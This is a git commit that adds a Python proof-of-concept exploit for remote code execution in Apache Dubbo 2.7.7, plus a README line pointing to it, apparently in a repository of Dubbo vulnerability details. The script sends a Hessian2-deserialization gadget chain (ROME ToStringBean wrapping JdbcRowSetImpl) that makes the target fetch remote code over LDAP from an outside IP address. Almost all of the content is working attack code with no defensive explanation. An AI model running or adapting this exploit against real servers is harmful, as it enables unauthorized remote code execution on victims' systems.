71c2c1c5b39b3978c2b6484aad764801e1a48496
1nter5e0 <Lynx@vfsec.com>
2020-07-02 16:00:51 +0800

    dubbo rce 2.7.7

---
+++ 2.7.7/poc.py
@@ -0,0 +1,29 @@
+#-*- coding:utf8 -*- 
+"""
+create by:galaxyLab
+"""
+
+from dubbo.codec.hessian2 import Decoder,new_object
+from dubbo.client import DubboClient
+
+client = DubboClient('127.0.0.1', 12347)
+
+JdbcRowSetImpl=new_object(
+      'com.sun.rowset.JdbcRowSetImpl',
+      dataSource="ldap://125.88.146.147:1099/calc",
+      strMatchColumns=["foo"]
+      )
+JdbcRowSetImplClass=new_object(
+      'java.lang.Class',
+      name="com.sun.rowset.JdbcRowSetImpl",
+      )
+toStringBean=new_object(
+      'com.rometools.rome.feed.impl.ToStringBean',
+      beanClass=JdbcRowSetImplClass,
+      obj=JdbcRowSetImpl
+      )
+
+resp = client.send_request_and_return_response(
+    service_name='cn.url',
+    method_name='rce',
+    args=[toStringBean])
--- README.md
+++ README.md
@@ -1,2 +1,4 @@
 # dubbo-vulinfo
 dubbo新版本漏洞详细
+
+## 2.7.7版本的dubbo漏洞详细在目录/2.7.7/
